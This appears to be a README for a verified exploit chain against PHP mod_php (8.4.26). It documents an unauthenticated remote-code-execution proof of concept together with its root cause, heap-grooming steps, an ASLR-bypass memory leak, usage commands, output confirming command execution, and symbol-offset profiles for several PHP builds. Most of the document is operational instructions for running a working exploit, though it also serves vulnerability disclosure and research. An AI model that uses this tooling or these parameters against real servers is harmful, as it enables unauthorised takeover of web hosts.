# Chain 2: OOM Corruption (CVE-2026-109618)

GHSA-w8hw-w9fx-j79w.

## Root cause

When PHP hits `memory_limit` during multipart request processing, `longjmp()` aborts to a setjmp point, skipping cleanup. Session progress structures retain stale pointers. The next request on the same Apache worker reads these stale pointers, leaking heap memory via the PHPSESSID Set-Cookie header.

## What we have

### Full RCE PoC (`poc_rce.py`)

A working, verified unauthenticated RCE exploit that handles real-world Apache mod_php deployments:

- **Worker pinning:** auto-detects Apache prefork worker count, pins N-1 workers with incomplete POST requests so all exploit traffic hits the same worker
- **Memory limit detection:** probes the target's `memory_limit` from OOM error messages
- **Auto-calibration:** discovers heap grooming parameters (STAGE1_N, forge_len, STAGE2_T) at runtime instead of hardcoding them
- **Profile system:** lookup table of known `php:*-apache` Docker image offsets (zif_system, zval_ptr_dtor), plus ELF symbol extraction from containers via `--extract-offsets`

Three stages, each a pair of HTTP requests to the same Apache worker:

**Stage 1 -- Zend MM chunk base leak:** (same as info leak below)
**Stage 2 -- libphp.so base leak:** (same as info leak below)
**Stage 3 -- RCE via fake HashTable:**
1. Request A: OOM trigger with calibrated padding (6 x 31B pad fields + Cookie header for valid PS(id))
2. Request B: Carrier spray (bin-40 grooming + 15 x 167B fake HashTable with pDestructor = zif_system)
3. Result: Session cleanup calls pDestructor on the fake HT, executing `system(cmd)` as www-data

```bash
# Full auto (detects workers, memory_limit, calibrates heap params)
python3 poc_rce.py -u http://TARGET:8896/index.php -c "id>/tmp/pwned" --container modphp-vuln

# Explicit single-worker, skip calibration
python3 poc_rce.py -u http://127.0.0.1:8896/index.php -c "id>/tmp/pwned" \
  --container modphp-vuln --workers 1 --no-calibrate --memory-limit 8

# Extract offsets from container's libphp.so
python3 poc_rce.py -u http://127.0.0.1:8896/index.php -c "id>/tmp/pwned" \
  --container modphp-vuln --extract-offsets

# Output:
#   [1/6] Fingerprint
#     PHP version: 8.4.26
#     Profile matched
#   [2/6] Memory limit
#     Detected: 8M
#   [3/6] Worker pinning
#     Detected 10 workers
#     Pinned 9 workers
#   [4/6] Auto-calibration
#     stage1_n=841 forge_len=63
#     stage2_t=406
#   [5/6] Exploit chain (attempt 1/3)
#     chunk_base = 0x7fdace000000
#     libphp_base = 0x7fdacffcb000
#     zif_system  = 0x7fdad0430370
#     [+] RCE CONFIRMED: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Verified:** RCE on php:8.4.26-apache (amd64) with 1, 5, and 10 workers. First spray attempt each time.
**Negative control:** PHP 8.4.27 detected as patched; exploit refuses to proceed.
**Max command length:** 14 bytes (limited by the 167-byte fake HashTable structure).

### Information disclosure PoC (`poc_info_leak.py`)

A working, verified ASLR bypass via PHPSESSID cookie memory disclosure. Two stages, each a pair of HTTP requests to the same Apache worker:

**Stage 1 -- Zend MM chunk base leak:**
1. Request A: 1001 x 1B fields + null PHPSESSID + upload progress + file + OOM trigger
2. Request B: 841 grooming fields of 48B + 79B forged zend_string (fakes len=0x1000)
3. Result: 4096-byte Set-Cookie containing heap pointers; extract 2MB-aligned chunk base

**Stage 2 -- libphp.so base leak:**
1. Request A: 1001 x 39B fields + null PHPSESSID + upload progress + file + OOM trigger
2. Request B: 983 fields with sub-array at index 406
3. Result: 16-byte Set-Cookie containing pDestructor pointer; low 12 bits match zval_ptr_dtor

Together these leak the Zend MM chunk base and the libphp.so load base, defeating ASLR.

```bash
# Against vulnerable mod_php (8.4.26, single-worker prefork, memory_limit=8M)
python3 poc_info_leak.py 8896

# Output:
#   [+] Zend MM chunk base: 0x7f76f6e00000
#   [+] libphp.so base:    0x7f76f8f6a000
#   [+] zif_system:        0x7f76f93cf370
```

**Verified:** 6/6 runs on php:8.4.26-apache (amd64), single-worker prefork.
**Negative control:** PHP 8.4.27 triggers the same OOM but returns a normal 32-byte session ID. No leak.

Build profile: `php-8.4.26-bookworm-amd64` (identical libphp.so SHA256, same offsets as devploit's verified profile).

### ASAN UAF proof (`verify_asan.sh`)

Builds PHP 8.4.26 from source with AddressSanitizer and runs `verify_uaf.php`, which triggers a `var_destroy` reentry UAF. ASAN reports:

```
heap-use-after-free at php_var_unserialize (var_unserializer.c:849)
  freed at var_destroy (var_unserializer.c:245)
```

This is a separate bug from the rfc1867 OOM chain. It fires on both 8.4.26 AND 8.4.27.

```bash
./verify_asan.sh           # builds and runs against PHP 8.4.26
./verify_asan.sh 8.4.27    # compare against patched version
```

### OOM trigger (`trigger_oom.py`)

Sends a multipart request to exhaust `memory_limit`. Demonstrates the trigger condition.

```bash
python3 trigger_oom.py --port 8896
```

## SAPI behavior

| SAPI | Version | OOM behavior |
|------|---------|-------------|
| mod_php | 8.4.26 | 200 OK with OOM error, process survives. Memory disclosure works. |
| mod_php | 8.4.27 | 200 OK with OOM error, process survives. No memory disclosure. |
| FPM | 8.4.26 | Worker crashes (exit 70), 502 Bad Gateway. No cross-request chain. |

## Lab requirements

The RCE PoC requires:
- `php:8.4.26-apache` or any unpatched `php:*-apache` image (mod_php, Apache prefork)
- `post_max_size` large enough for the OOM trigger (default 256M is fine)
- `display_errors = On` (for memory_limit auto-detection; exploit works without it but needs `--memory-limit`)
- `session.upload_progress.enabled = On` (PHP default)
- `session.use_strict_mode = 0` (PHP default)

The exploit auto-detects worker count and memory_limit, and auto-calibrates heap grooming parameters at runtime. Single-worker mode is no longer required.

## Build profiles

Symbol offsets (zif_system, zval_ptr_dtor) are build-specific constants. The exploit ships with profiles for:

| Build | Architecture | Status |
|-------|-------------|--------|
| 8.4.26 | amd64 | Verified RCE |
| 8.4.25 | aarch64 | Offsets verified |
| 8.5.11 | amd64 | Offsets verified |
| 8.5.11 | aarch64 | Offsets verified |
| 8.5.10 | aarch64 | Offsets verified |
| 8.5.0 | amd64 | Offset-only |
| 8.3.0 | amd64 | Offset-only |

For unlisted builds, use `--extract-offsets --container NAME` to parse offsets from the container's libphp.so ELF symbol table.

## Profile values (php-8.4.26-bookworm-amd64)

```
zif_system     = 0x465370
zval_ptr_dtor  = 0x65eb60
stage1_n       = 841
stage1_forge   = 79
stage2_t       = 406
stage2_v       = 16
oom_margin     = 12 MB
```

## References

- PHP Advisory: GHSA-w8hw-w9fx-j79w
- devploit/php2shell build profiles (calibration methodology)
